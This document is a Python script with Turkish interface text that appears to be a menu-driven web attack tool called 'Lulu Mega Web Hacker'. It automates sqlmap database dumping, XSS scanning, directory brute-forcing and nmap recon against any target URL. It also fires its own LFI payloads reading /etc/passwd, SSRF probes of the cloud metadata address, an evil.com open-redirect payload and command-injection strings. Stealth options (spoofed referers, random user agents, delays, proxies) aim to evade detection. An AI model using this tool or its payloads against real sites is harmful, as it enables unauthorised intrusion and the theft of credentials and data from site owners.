# mega_web_hacker_report_clear.py - Lulu'nun rapor temizleme'li hali
import os
import sys
import subprocess
import requests
import random
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import colorama
from colorama import Fore, Style
from datetime import datetime
import socket

colorama.init(autoreset=True)

ua = UserAgent()

STEALTH_MODE = True
PROXY = None
REPORT_FILE = "tarama_raporu.txt"
USE_FAKEROOT = True

found_vulns = []

def log_to_file(msg):
    with open(REPORT_FILE, "a", encoding="utf-8") as f:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{ts}] {msg}\n")

def add_vuln(vuln_type, details):
    found_vulns.append(f"[{vuln_type}] {details}")
    print(Fore.GREEN + f"[BULUNDU] {vuln_type}: {details}")
    log_to_file(f"[BULUNDU] {vuln_type}: {details}")

def clear_report():
    global found_vulns
    found_vulns = []
    print(Fore.GREEN + "Rapor temizlendi! Yeni tarama için hazır.")
    log_to_file("Rapor temizlendi")

def print_final_report():
    clear()
    banner()
    print(Fore.RED + "\n=== TARMA SONU RAPORU ===\n")
    if not found_vulns:
        print(Fore.YELLOW + "Hiçbir açık tespit edilmedi.")
    else:
        print(Fore.GREEN + "Bulunanlar:")
        for i, v in enumerate(found_vulns, 1):
            print(f"{i}. {v}")
    print(Fore.RED + f"\nRapor dosyası: {REPORT_FILE}")
    print(Fore.RED + "==========================\n")
    temizle = input(Fore.YELLOW + "Raporu temizlemek ister misin? (e/h): ").lower()
    if temizle == 'e':
        clear_report()

def get_headers():
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9",
        "Referer": random.choice(["https://www.google.com/", "https://www.bing.com/"]),
        "Connection": "keep-alive"
    }

def stealth_sleep(min_sec=1, max_sec=3):
    if STEALTH_MODE:
        delay = random.uniform(min_sec, max_sec)
        print(Fore.CYAN + f"Bekleme: {delay:.1f}s")
        time.sleep(delay)

def stealth_request(url, method="GET", **kwargs):
    stealth_sleep()
    s = requests.Session()
    if PROXY:
        s.proxies = {"http": PROXY, "https": PROXY}
    kwargs.setdefault("headers", get_headers())
    kwargs.setdefault("timeout", 12)
    try:
        if method == "GET":
            r = s.get(url, **kwargs)
        else:
            r = s.post(url, **kwargs)
        log_to_file(f"Request: {method} {url} | {r.status_code}")
        return r
    except Exception as e:
        log_to_file(f"Request ERROR: {url} → {str(e)}")
        return None

def banner():
    print(Fore.RED + """
    ╔════════════════════════════════════════════╗
    ║     LULU MEGA WEB HACKER v1011 CLEAR       ║
    ║   Eren Özel - Rapor temizleme eklendi      ║
    ╚════════════════════════════════════════════╝
    """)

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def menu():
    global STEALTH_MODE, PROXY, USE_FAKEROOT
    clear()
    banner()
    print(Fore.YELLOW + f"Stealth: {'ON' if STEALTH_MODE else 'OFF'} | Proxy: {PROXY or 'Yok'} | Fakeroot: {'AKTİF' if USE_FAKEROOT else 'KAPALI'}")
    target = input(Fore.CYAN + "Hedef URL (https:// ile): ").strip()
    if not target.startswith("http"):
        target = "https://" + target

    while True:
        clear()
        banner()
        print(Fore.GREEN + f"Hedef: {target}\n")
        print(Fore.MAGENTA + "[1] SQL Injection")
        print("[2] XSS")
        print("[3] LFI/RFI")
        print("[4] Open Redirect/SSRF")
        print("[5] Command Injection")
        print("[6] Directory Brute")
        print("[7] Headers Check")
        print("[8] Quick Recon")
        print("[9] HEPSİNİ ÇALIŞTIR + RAPOR")
        print("[r] Son raporu göster")
        print("[c] Raporu temizle")  # YENİ EK: Rapor temizleme
        print("[f] Fakeroot aç/kapa")
        print("[s] Stealth aç/kapa")
        print("[p] Proxy ayarla")
        print("[0] Çıkış")
        ch = input(Fore.BLUE + "Seç → ").lower()

        if ch == "1": sql_injection(target)
        elif ch == "2": xss_attack(target)
        elif ch == "3": lfi_rfi(target)
        elif ch == "4": open_redirect_ssrf(target)
        elif ch == "5": command_injection(target)
        elif ch == "6": dir_brute(target)
        elif ch == "7": check_headers(target)
        elif ch == "8": quick_recon(target)
        elif ch == "9": all_in_one(target)
        elif ch == "r":
            print_final_report()
        elif ch == "c":
            clear_report()
            input(Fore.WHITE + "Rapor temizlendi, enter ile devam...")
        elif ch == "f":
            USE_FAKEROOT = not USE_FAKEROOT
            print(Fore.GREEN + f"Fakeroot {'AKTİF' if USE_FAKEROOT else 'KAPALI'}")
            time.sleep(1)
        elif ch == "s":
            STEALTH_MODE = not STEALTH_MODE
            print(Fore.GREEN + f"Stealth {'ON' if STEALTH_MODE else 'OFF'}")
            time.sleep(1)
        elif ch == "p":
            PROXY = input(Fore.YELLOW + "Proxy gir veya boş: ").strip() or None
            print(Fore.GREEN + f"Proxy: {PROXY or 'Yok'}")
            time.sleep(1)
        elif ch == "0":
            print_final_report()
            return
        else:
            print(Fore.RED + "Hatalı seçim.")

def run_cmd(cmd, timeout=900):
    prefix = "fakeroot " if USE_FAKEROOT and "fakeroot " not in cmd else ""
    full_cmd = prefix + cmd
    print(Fore.CYAN + f"Çalıştırılıyor: {full_cmd}")
    try:
        proc = subprocess.Popen(full_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)
        while True:
            line = proc.stdout.readline()
            if not line and proc.poll() is not None:
                break
            if line:
                print(line.strip())
                log_to_file(line.strip())
        proc.wait(timeout=timeout)
        print(Fore.GREEN + "Komut tamamlandı.")
        return "Tamamlandı"
    except subprocess.TimeoutExpired:
        proc.kill()
        print(Fore.RED + f"Timeout geçti ({timeout}s)")
        return None
    except Exception as e:
        print(Fore.RED + f"Çalıştırma hatası: {full_cmd} → {str(e)}")
        log_to_file(f"Çalıştırma hatası: {full_cmd} → {str(e)}")
        return None

def sql_injection(url):
    print(Fore.YELLOW + "SQLmap taranıyor...")
    stealth_sleep()
    sqlmap_path = "sqlmap" if subprocess.call("which sqlmap > /dev/null 2>&1", shell=True) == 0 else os.path.expanduser("\~/sqlmap/sqlmap.py")
    extra = "--batch --random-agent --threads=1 --risk=1 --level=2 --delay=5 --tamper=space2comment --forms --crawl=2 --dbs"
    full_cmd = f"python {sqlmap_path} -u '{url}' {extra}"
    run_cmd(full_cmd)

def xss_attack(url):
    print(Fore.YELLOW + "XSS taranıyor...")
    stealth_sleep()
    run_cmd(f"python \~/XSStrike/xsstrike.py -u '{url}' --crawl --level 3 --delay 6")
    stealth_sleep()
    run_cmd(f"python -c \"import bane; bane.XSS_Scanner.scan('{url}', threads=1)\"")

def lfi_rfi(url):
    print(Fore.YELLOW + "LFI/RFI test...")
    payloads = ["?file=../../../etc/passwd", "?page=....//....//etc/passwd", "?file=php://filter/convert.base64-encode/resource=index.php"]
    for p in payloads:
        test = urljoin(url, p)
        r = stealth_request(test)
        if r and ("root:" in r.text):
            add_vuln("LFI/RFI", f"Başarılı: {test}")

def open_redirect_ssrf(url):
    print(Fore.YELLOW + "Open Redirect/SSRF...")
    payloads = ["?next=https://evil.com", "?redirect=//google.com", "?url=http://169.254.169.254/latest/meta-data/"]
    for p in payloads:
        test = urljoin(url, p)
        r = stealth_request(test, allow_redirects=False)
        if r and r.status_code in (301, 302) and "evil.com" in r.headers.get("Location", ""):
            add_vuln("Open Redirect", f"Başarılı: {test}")

def command_injection(url):
    print(Fore.YELLOW + "Command Injection...")
    payloads = [";whoami", "|id", "&&ping -c 1 127.0.0.1"]
    for p in payloads:
        test = f"{url}{p}"
        r = stealth_request(test)
        if r and ("uid=" in r.text or "www-data" in r.text):
            add_vuln("Command Injection", f"Başarılı: {test}")

def dir_brute(url):
    print(Fore.YELLOW + "Dir brute...")
    extra = "--random-agent --delay=5 --exclude-status=404,403,429 --threads=1"
    run_cmd(f"python -m dirsearch -u {url} -e php,html,txt,js,bak {extra} --simple-report=dirs.txt")
    add_vuln("Directory Brute", "Dirsearch tamamlandı")

def check_headers(url):
    print(Fore.YELLOW + "Headers kontrol...")
    r = stealth_request(url)
    if r:
        h = r.headers
        if 'Content-Security-Policy' not in h:
            add_vuln("Security Misconfig", "CSP yok")
        if 'X-Frame-Options' not in h:
            add_vuln("Security Misconfig", "Clickjacking mümkün")

def quick_recon(url):
    domain = urlparse(url).netloc
    print(Fore.YELLOW + f"Quick recon → {domain}")
    try:
        ip = socket.gethostbyname(domain)
        print(Fore.CYAN + f"IP: {ip}")
    except:
        pass
    try:
        run_cmd(f"nmap -sT -Pn -F --open {domain}")
    except Exception as e:
        print(Fore.RED + f"Nmap hata: {e}")

def all_in_one(url):
    quick_recon(url)
    check_headers(url)
    sql_injection(url)
    xss_attack(url)
    lfi_rfi(url)
    open_redirect_ssrf(url)
    command_injection(url)
    dir_brute(url)
    print_final_report()

if __name__ == "__main__":
    log_to_file("=== BAŞLADI ===")
    while True:
        menu()
        if input(Fore.WHITE + "Başka hedef? (e/h): ").lower() != 'e':
            print_final_report()
            print(Fore.RED + "Lulu bitti.")
            sys.exit(0)